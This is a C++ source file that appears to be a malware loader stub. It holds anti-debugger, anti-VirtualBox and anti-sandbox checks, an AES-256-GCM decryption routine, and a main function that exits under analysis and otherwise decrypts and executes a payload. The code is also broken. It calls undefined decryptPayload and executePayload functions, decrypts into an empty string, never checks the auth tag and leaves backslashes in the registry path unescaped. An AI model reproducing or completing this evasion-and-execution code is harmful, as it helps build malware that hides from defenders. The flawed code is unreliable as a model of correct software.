#include <iostream>
#include <vector>
#include <string>
#include <windows.h>
#include <openssl/evp.h>
#include <openssl/aes.h>
#include <openssl/rand.h>

// Anti-Debug Code
bool isDebuggerPresent() {
    return IsDebuggerPresent() || CheckRemoteDebuggerPresent(GetCurrentProcess(), NULL);
}

// Anti-VM Code
bool isVirtualMachine() {
    // Check for VM registry keys
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SYSTEM\ControlSet001\Services\VBoxService", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        RegCloseKey(hKey);
        return true;
    }
    return false;
}

// Anti-Sandbox Code
bool isSandbox() {
    // Check system uptime
    DWORD uptime = GetTickCount();
    if (uptime < 600000) { // Less than 10 minutes
        return true;
    }
    return false;
}

// Decryption Code

// AES-256-GCM Decryption Implementation
#include <openssl/aes.h>
#include <openssl/evp.h>
#include <string.h>

std::string decryptAES256GCM(const std::string& encryptedData, const std::string& key, 
                            const std::string& iv, const std::string& authTag) {
    EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
    if (!ctx) return "";
    
    if (EVP_DecryptInit_ex(ctx, EVP_aes_256_gcm(), NULL, 
                          (unsigned char*)key.c_str(), 
                          (unsigned char*)iv.c_str()) != 1) {
        EVP_CIPHER_CTX_free(ctx);
        return "";
    }
    
    std::string decrypted;
    int len;
    int decryptedLen;
    
    if (EVP_DecryptUpdate(ctx, (unsigned char*)decrypted.data(), &len,
                         (unsigned char*)encryptedData.c_str(), encryptedData.length()) != 1) {
        EVP_CIPHER_CTX_free(ctx);
        return "";
    }
    decryptedLen = len;
    
    if (EVP_DecryptFinal_ex(ctx, (unsigned char*)decrypted.data() + len, &len) != 1) {
        EVP_CIPHER_CTX_free(ctx);
        return "";
    }
    decryptedLen += len;
    
    EVP_CIPHER_CTX_free(ctx);
    return decrypted.substr(0, decryptedLen);
}

int main() {
    // Anti-analysis checks
    if (isDebuggerPresent()) {
        ExitProcess(1);
    }
    
    if (isVirtualMachine()) {
        ExitProcess(1);
    }
    
    if (isSandbox()) {
        ExitProcess(1);
    }
    
    // Decrypt and execute payload
    std::vector<unsigned char> payload = decryptPayload();
    if (!payload.empty()) {
        executePayload(payload);
    }
    
    return 0;
}